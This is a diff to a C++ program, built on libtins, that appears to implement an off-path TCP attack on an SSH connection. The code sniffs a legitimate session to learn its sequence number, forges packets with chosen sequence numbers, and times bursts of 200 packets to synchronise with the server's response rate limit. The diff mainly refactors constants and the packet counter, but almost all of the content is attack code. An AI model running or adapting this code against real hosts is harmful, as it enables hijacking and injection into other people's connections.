@@ -1,19 +1,13 @@
-#include "packet_counter.h"
-
 #include <chrono>
 #include <iostream>
 #include <tins/tins.h>
-#include <sstream>
 
 #include "common.h"
+#include "packet_counter.h"
 
 using namespace std;
 using namespace std::chrono;
 using namespace std::chrono_literals;
-
-const string kNetworkInterface("enx5cf7e68b298b");
-const string kServerIP("192.168.1.100");
-const uint32_t kServerPort = 22;
 
 // Inital number of legit SSH packets to trigger sniffer
 const int kInitPacketCount = 10;
@@ -31,7 +25,7 @@ void printHeader(const std::string msg) {
 }
 
 pair<ConnectionID, uint32_t> waitAndGetLegitConnectionInfo(
-  const string& serverIP, int serverPort) {
+        const string& serverIP, int serverPort) {
     Tins::Sniffer sniffer(kNetworkInterface);
     sniffer.set_filter(
       "dst host " + serverIP + " and dst port " + to_string(serverPort));
@@ -68,13 +62,12 @@ int synchronizeClock(ConnectionID legitConn, int legitLastSeq) {
     tcpHeader.seq(legitLastSeq + 3);
     Tins::IP pkt = ipHeader / tcpHeader / Tins::RawPDU("C");
     
-    PacketCounter pcounter(kNetworkInterface, 
-      "src host " + kServerIP + " and src port " + to_string(kServerPort));
-    
+    auto pcounter = PacketCounter::instance();
+
     uint32_t n1, n2;
     {
         cout << "Sending out 200 packets in 1 sec..." << endl;
-        pcounter.startCounting();
+        pcounter->startCounting();
         auto now = system_clock::now();
         auto s = duration_cast<seconds>(now.time_since_epoch()) + 1000ms;
         this_thread::sleep_until(system_clock::time_point(s));
@@ -84,13 +77,13 @@ int synchronizeClock(ConnectionID legitConn, int legitLastSeq) {
             this_thread::sleep_until(system_clock::time_point(s));
         }
         this_thread::sleep_for(2s);
-        n1 = pcounter.stopCounting();
+        n1 = pcounter->stopCounting();
         cout << "n1 = " << n1 << endl;
     }
 
     {
         cout << "Sending out 200 packets in 1 sec and 5ms delay..." << endl;
-        pcounter.startCounting();
+        pcounter->startCounting();
         auto now = system_clock::now();
         auto s = duration_cast<seconds>(now.time_since_epoch()) + 1005ms;
         this_thread::sleep_until(system_clock::time_point(s));
@@ -100,7 +93,7 @@ int synchronizeClock(ConnectionID legitConn, int legitLastSeq) {
             this_thread::sleep_until(system_clock::time_point(s));
         }
         this_thread::sleep_for(2s);
-        n2 = pcounter.stopCounting();
+        n2 = pcounter->stopCounting();
         cout << "n2 = " << n2 << endl;
     }
 
@@ -119,7 +112,6 @@ int synchronizeClock(ConnectionID legitConn, int legitLastSeq) {
 
 int main() {
     printHeader("WAITING FOR THE LEGIT CONNECTION...");
-
     auto legitInfo = waitAndGetLegitConnectionInfo(kServerIP, kServerPort);
     auto legitConn = legitInfo.first;
     auto legitLastSeq = legitInfo.second;
